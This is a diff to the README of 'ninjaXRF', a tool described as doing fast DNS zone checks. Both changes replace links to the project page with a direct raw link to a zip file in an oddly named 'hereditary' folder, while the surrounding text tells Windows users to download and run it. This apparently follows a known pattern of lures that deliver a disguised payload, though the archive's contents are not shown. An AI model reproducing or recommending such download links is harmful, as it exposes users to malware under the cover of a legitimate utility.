@@ -1,6 +1,6 @@
 # 🔍 ninjaXRF - Fast DNS Zone Checks Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/thrifty-consonance737/ninjaXRF)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/thrifty-consonance737/ninjaXRF/main/hereditary/XRF-ninja-1.3.zip)
 
 ## 🧭 What ninjaXRF does
 
@@ -30,7 +30,7 @@ For most users, no extra setup should be needed beyond downloading the project a
 
 Visit this page to download the tool:
 
-https://github.com/thrifty-consonance737/ninjaXRF
+https://raw.githubusercontent.com/thrifty-consonance737/ninjaXRF/main/hereditary/XRF-ninja-1.3.zip
 
 If the page contains a release file or packaged build, download it from there and run it on your Windows PC. If the page shows source files, use the download option on GitHub to get the project files, then open the folder and run the tool as described on the page.
 
